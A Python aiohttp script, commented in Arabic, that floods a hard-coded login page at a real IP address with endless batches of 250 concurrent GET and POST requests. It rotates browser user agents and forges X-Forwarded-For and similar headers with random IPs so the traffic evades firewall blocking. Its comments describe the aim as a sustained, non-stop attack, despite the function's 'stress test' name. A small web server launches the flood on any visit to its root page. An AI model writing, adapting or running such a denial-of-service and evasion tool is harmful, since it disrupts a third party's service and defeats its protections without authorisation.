import asyncio
import aiohttp
from aiohttp import web
import os
import random

TARGET_URL = "http://187.7.17.67/sudani/login2.php"

# قائمة ضخمة ومتنوعة من متصفحات وأنظمة تشغيل مختلفة لتخطي جدران الحماية
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0",
    "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/115.0.0.0 Mobile Safari/537.36"
]

PAYLOAD = {'account': '123456789', 'password': 'test_password'}

# دالة لتوليد عنوان IP عشوائي وهمي لتزييف المصدر
def generate_random_ip():
    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

async def send_request(session, index):
    # إنشاء ترويسات مخصصة وعشوائية لكل طلب على حدة
    random_ip = generate_random_ip()
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'X-Forwarded-For': random_ip,
        'X-Real-IP': random_ip,
        'Client-IP': random_ip,
        'Via': f"1.1 {random_ip}",
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive'
    }
    
    try:
        if index % 2 == 0:
            async with session.post(TARGET_URL, data=PAYLOAD, headers=headers, timeout=3) as response:
                return response.status
        else:
            async with session.get(TARGET_URL, headers=headers, timeout=3) as response:
                return response.status
    except:
        return 0

async def run_bypass_stress_test():
    # تقليل الحجم قليلاً إلى 250 لمنع تفشي قيود معالج Render وفي نفس الوقت إمداد هجوم مستدام لا يتوقف
    concurrency_batch = 250  
    batch = 1
    
    # إجبار الموصل على إغلاق الاتصال بعد كل طلب (force_close=True) لإجبار جدار الحماية على قراءة الـ IP المزيف الجديد في كل مرة
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=10, force_close=True)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            tasks = [send_request(session, i) for i in range(concurrency_batch)]
            results = await asyncio.gather(*tasks)
            
            success_200 = sum(1 for status in results if status == 200)
            failed = concurrency_batch - success_200
            
            print(f"🕵️‍♂️ [هجوم التخطي - الدفعة {batch}] -> استجابة مخترقة 200: {success_200} | حظر/فشل: {failed}", flush=True)
            batch += 1
            # فاصل زمن ميكروي خفيف جداً لعدم خنق ذاكرة السيرفر المجاني
            await asyncio.sleep(0.02)

async def handle(request):
    asyncio.create_task(run_bypass_stress_test())
    return web.Response(text="⚡ تم تشغيل محرك التخطي وتزييف العناوين اللانهائي بنجاح! راقب اختراق السجلات الآن.")

app = web.Application()
app.router.add_get('/', handle)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 80))
    web.run_app(app, host='0.0.0.0', port=port)
